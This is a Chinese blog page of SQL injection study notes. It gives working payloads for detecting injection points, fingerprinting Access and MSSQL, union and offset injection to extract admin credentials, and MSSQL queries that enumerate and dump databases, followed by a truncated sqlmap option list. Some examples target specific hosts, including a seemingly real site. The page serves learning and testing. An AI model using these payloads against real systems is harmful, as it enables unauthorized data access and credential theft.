@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Al0nez" />
+
+
+
+<meta name="description" content="数据库Access，mysql，mongoDB，postsql，sqlite，oracle，sybase等">
+<meta property="og:type" content="article">
+<meta property="og:title" content="15WEB漏洞--SQL注入之Oracle、MongoDB注入">
+<meta property="og:url" content="https://al0nez.github.io/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Al0nez&#39;s Bolg">
+<meta property="og:description" content="数据库Access，mysql，mongoDB，postsql，sqlite，oracle，sybase等">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104696.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105187.png">
+<meta property="og:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105080.png">
+<meta property="article:published_time" content="2021-09-21T02:29:13.000Z">
+<meta property="article:modified_time" content="2021-09-21T03:22:22.251Z">
+<meta property="article:author" content="Al0nez">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="小迪学习笔记">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104696.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Al0nez&#39;s Bolg" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>15WEB漏洞--SQL注入之Oracle、MongoDB注入 | Al0nez&#39;s Bolg</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Al0nez</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                            <li><a href="/tags/">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" href="#" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" target="_blank" rel="noopener" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Al0nez</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Al0nez</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">我与春风皆过客,你携秋水揽星河</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa 博客园" target="_blank" href="/L0ne1y.github.io" title="博客园"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="#" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-15WEB漏洞-SQL注入之Oracle、MongoDB注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/21/15WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E3%80%81MongoDB%E6%B3%A8%E5%85%A5/" class="article-date">
+      <time datetime="2021-09-21T02:29:13.000Z" itemprop="datePublished">2021-09-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      15WEB漏洞--SQL注入之Oracle、MongoDB注入
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">小迪学习笔记</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>Access，mysql，mongoDB，postsql，sqlite，oracle，sybase等</p>
+<span id="more"></span>
+
+<p>mysql mssql等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据库A</span><br><span class="line">	表名</span><br><span class="line">		列名</span><br><span class="line">			数据</span><br><span class="line">数据库B</span><br><span class="line">	...........</span><br></pre></td></tr></table></figure>
+
+<p>Access </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  表名</span><br><span class="line"></span><br><span class="line">   	列名</span><br><span class="line"></span><br><span class="line">数据</span><br></pre></td></tr></table></figure>
+
+<p>  access数据库没有数据库名，数据库会保存在网站源码下面，数据库是独立的，所以无法进行跨库注入，access没有向其他数据库一样的功能，没有文件读写的功能。</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211104696.png" alt="image-20210827145602483"></p>
+<h4 id="什么决定网站注入点用户权限？"><a href="#什么决定网站注入点用户权限？" class="headerlink" title="什么决定网站注入点用户权限？"></a>什么决定网站注入点用户权限？</h4><p>数据库配置文件的用户，是谁连接的  </p>
+<h3 id="简要学习各种数据库的注入特点"><a href="#简要学习各种数据库的注入特点" class="headerlink" title="简要学习各种数据库的注入特点"></a>简要学习各种数据库的注入特点</h3><p>数据库架构组成，数据库高权限操作</p>
+<h3 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h3><p>正常情况下，access注入需要通过猜解表名和字段名去注入。</p>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47744/new_list.asp?id=1&#x27;		#页面报错</span><br><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 and 1=1    #页面正常</span><br><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 and 1=2   #页面报错</span><br></pre></td></tr></table></figure>
+
+<p>说明是数字型注入</p>
+<h4 id="判断是不是access数据库"><a href="#判断是不是access数据库" class="headerlink" title="判断是不是access数据库"></a>判断是不是access数据库</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若带入 and (<span class="function">select <span class="title">count</span><span class="params">(*)</span> from msysobjects)&gt;0 </span></span><br><span class="line"><span class="function">由于msysobjects表在access数据库中无权访问所以返回错误--为access数据库</span></span><br></pre></td></tr></table></figure>
+
+<p>因为access数据库有时候添加上面的语句就报错，所以我们不知道是不是access数据库，这里我们根据脚本语言判断 如果语言为asp,基本就是access数据库，aspx可能是mssql很少是access。所以我们要判断是不是access数据库。只需要看是不是asp 语言，如果是aspx就判断他是不是MSSQL数据库即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#若带入and (select count(*) from sysobjects)&gt;0 </span><br><span class="line">#由于sysobjects表在MSSQL数据库中可以正常访问所以当返回正常页面时表示为MSSQL数据库</span><br><span class="line"></span><br><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and (select count(*) from sysobjects)&gt;0    #错误表示不是mssql,而是access、数据库</span><br></pre></td></tr></table></figure>
+
+<h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>如果有回显的话可以用联合注入,无回显就用盲注</p>
+<p>order by 语句判断列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:47744/new_list.asp?id=1 order by 4</span><br></pre></td></tr></table></figure>
+
+<h5 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h5><p>因为我们已经知道字段数了，所以剩下的就是表名了，这个需要自己去猜，或者使用工具跑，正确就会返回回显的位置，错误就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 union select 1,2,3,4 from admin(自己猜测的)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select * from admin) 	#判断查询结果是否存在</span><br></pre></td></tr></table></figure>
+
+<h5 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h5><p>然后就是猜列名，一顿猜。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 union select 1,username,passwd,4 from admin(自己猜测的)</span><br></pre></td></tr></table></figure>
+
+<p>也可以这样猜，盲注一般用这个，因为没有回显。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id from admin)   #页面返回正常表示存在</span><br><span class="line">http://219.153.49.228:43394/new_list.asp?id=1 and exists (select id,username from admin)   #页面返回正常表示存在</span><br></pre></td></tr></table></figure>
+
+<h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><p><strong>偏移注入主要是针对知道表，但是不知道字段的。</strong></p>
+<p>这里我已经知道了表明是：sys_admin</p>
+<p>可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from sys_admin);</span><br></pre></td></tr></table></figure>
+
+<p>来猜测是否有sys_admin表，如果说存在的话页面就会显示正常。</p>
+<p><strong>00x1 判断字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/newslist.asp?id=688 order by 19 #错误</span><br><span class="line">http://www.test.com/newslist.asp?id=688 order by 18 #正确</span><br></pre></td></tr></table></figure>
+
+<p><strong>00x2 爆出显示位</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18 from sys_admin</span><br></pre></td></tr></table></figure>
+
+<img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105187.png" alt="image-20210827161837286" style="zoom:67%;" />
+
+ 
+
+<p><strong>00x3 判断表内存在的字段数</strong></p>
+<p>接下来我们利用“<em>”代替admin表内存在的字段，由于是18个字段数，需要逐步测试，直到返回正常。这里”</em>“也可以使用sys_admin.*代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,* from sys_admin  #错误</span><br><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from sys_admin    #错误</span><br><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,* from sys_admin      #错误</span><br><span class="line">直到.........http://www.test.com/newslist.asp?id=688 union select 1,2,3,4,5,6,7,8,9,10,11,* from sys_admin #正确</span><br></pre></td></tr></table></figure>
+
+<p>18-11=7，也就是说明sys_admin表有7个字段</p>
+<p><strong>偏移注入的基本公式为:</strong></p>
+<p>​      <strong>order by 出的字段数减去</strong><em><strong>号的字段数</strong>，然而再用</em><em>order by的字段数减去</em>*<strong>2倍刚才得出来的答案</strong></p>
+<p>　　　　也就是18-11=7</p>
+<p>　　　　　　　18-7*2=4</p>
+<p>得到答案等于：4</p>
+<p>然后依旧是套公式的过程。</p>
+<p>这里的id必须是存在的。也是就说必须要知道一个字段，所以要靠运气。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.fdsp-reme.com/newslist.asp?id=688 union select 1,2,3,4,a.id,b.id,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)</span><br><span class="line"></span><br><span class="line">#这里union select 1,2,3,4：顾名思义就是刚才得出来的长度。</span><br><span class="line">#后面的是sql，可作公式。</span><br></pre></td></tr></table></figure>
+
+<p>如此便爆出了账号密码。</p>
+<p>但是我测试的这个网站，略微有点特殊。如下图所示</p>
+<p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211105080.png" alt="image-20210827172708527"></p>
+<h3 id="SQL-server-MSSQL注入"><a href="#SQL-server-MSSQL注入" class="headerlink" title="SQL server/MSSQL注入"></a>SQL server/MSSQL注入</h3><p><strong>①</strong>判断数据库类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个哈</span><br></pre></td></tr></table></figure>
+
+<p><strong>②</strong>判断数据库版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=@@version--这个语句要在有回显的模式下才可以哦</span><br><span class="line">and substring((select  @@version),22,4)=&#x27;2008&#x27;--</span><br><span class="line">适用于无回显模式，后面的2008就是数据库版本，返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2008的话就返回正常）</span><br></pre></td></tr></table></figure>
+
+<p><strong>③</strong>获取所有数据库的个数 (一下3条语句可供选择使用) </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. and 1=(select quotename(count(name)) from master..sysdatabases)--</span><br><span class="line">2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) --</span><br><span class="line">3. and 1=(select str(count and 1=(select quotename(count(name)) from master..sysdatabases where dbid&gt;5)--</span><br><span class="line">   and 1=(select str(count(name))%2b&#x27;|&#x27; from master..sysdatabases where dbid&gt;5) --</span><br><span class="line">   and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) --</span><br><span class="line">说明：dbid从1-4的数据库一般为系统数据库.</span><br></pre></td></tr></table></figure>
+
+<p><strong>⑤</strong>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from master..sysdatabases FOR XML PATH(&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p><strong>⑥</strong>获取当前数据库 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and db_name()&gt;0</span><br><span class="line">and 1=(select db_name())--</span><br></pre></td></tr></table></figure>
+
+<p><strong>⑦</strong>获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select quotename(name) from 数据库名..sysobjects where xtype=&#x27;U&#x27; FOR XML PATH(&#x27;&#x27;))-- </span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from 数据库名..sysobjects where xtype=&#x27;U&#x27;  FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line">复制代码测试效果图：得到  3个敏感的表：Whir_Sec_Users/Whir_Mem_Member/Whir_Mem_MemberGroup</span><br></pre></td></tr></table></figure>
+
+<p><strong>⑧</strong>获得表里的列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一次爆指定表的所有列（只限于mssql2005及以上版本）:</span><br><span class="line">and 1=(select quotename(name) from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#x27;指定表名&#x27;) FOR XML PATH(&#x27;&#x27;))-- </span><br><span class="line">and 1=(select &#x27;|&#x27;%2bname%2b&#x27;|&#x27; from 数据库名..syscolumns where id =(select  id from 数据库名..sysobjects where name=&#x27;指定表名&#x27;) FOR XML PATH(&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>
+
+<p>效果图：既然有账户信息，我就不管是不是管理员的的了，我帖子的目的不是为了得到管理员的信息，只是为了演示可以通过这个方法来获取相关信息。</p>
+<p><strong>⑨</strong>获取指定数据库中的表的列的数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）:</span><br><span class="line">and 1=(select top 1 * from 指定数据库..指定表名 where排除条件 FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">一次性爆N条所有字段的数据（只限于mssql2005及以上版本）:</span><br><span class="line">and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">复制代码第一条语句：</span><br><span class="line">and 1=(select top 1 * from 指定数据库..指定表名 FOR XML  PATH(&#x27;&#x27;))--</span><br><span class="line"></span><br><span class="line">测试效果图：----------------------------------</span><br><span class="line">加上where条件筛选结果出来会更加好，</span><br><span class="line">如：where and name like &#x27;%user%&#x27; 就会筛选出含有user关键词的出来。用在筛选表段时很不错。</span><br></pre></td></tr></table></figure>
+
+<p>注意：在使用一次获取数据库信息的语句时，请使用火狐浏览器，笔者测试  IE8、360急速浏览器、猎豹浏览器均卡死，火狐浏览器也会导致出现几秒钟的卡死，弹出框框，我们点击“停止脚本”就会得到初步解决。！！！！！！！！！！！！！！！！！！！！至此，我们已经得到了账户信息了，至于管理员的呢，哈哈，大家自行测试时换表啥的就好了。</p>
+<h3 id="PostgraSQL注入原理"><a href="#PostgraSQL注入原理" class="headerlink" title="PostgraSQL注入原理"></a>PostgraSQL注入原理</h3><p>直接参考这个，没必要记住，能看懂就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.webshell.cc/524.html</span><br><span class="line">https://www.cnblogs.com/yilishazi/p/14710349.html</span><br><span class="line">https://www.jianshu.com/p/ba0297da2c2e</span><br></pre></td></tr></table></figure>
+
+<h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/peterpan0707007/p/8242119.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="MongoDB注入"><a href="#MongoDB注入" class="headerlink" title="MongoDB注入"></a>MongoDB注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_33881753/article/details/87981552</span><br><span class="line">https://www.secpulse.com/archives/3278.html</span><br></pre></td></tr></table></figure>
+
+<h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><h4 id="sqlmap支持的数据库"><a href="#sqlmap支持的数据库" class="headerlink" title="sqlmap支持的数据库"></a>sqlmap支持的数据库</h4><p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">基本操作笔记：-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;  恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6) </span><br><span class="line">    0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">    1：显示信息和警告消息。</span><br><span class="line">    2：显示调试消息。</span><br><span class="line">    3：有效载荷注入。</span><br><span class="line">    4：显示HTTP请求。</span><br><span class="line">    5：显示HTTP响应头。</span><br><span class="line">    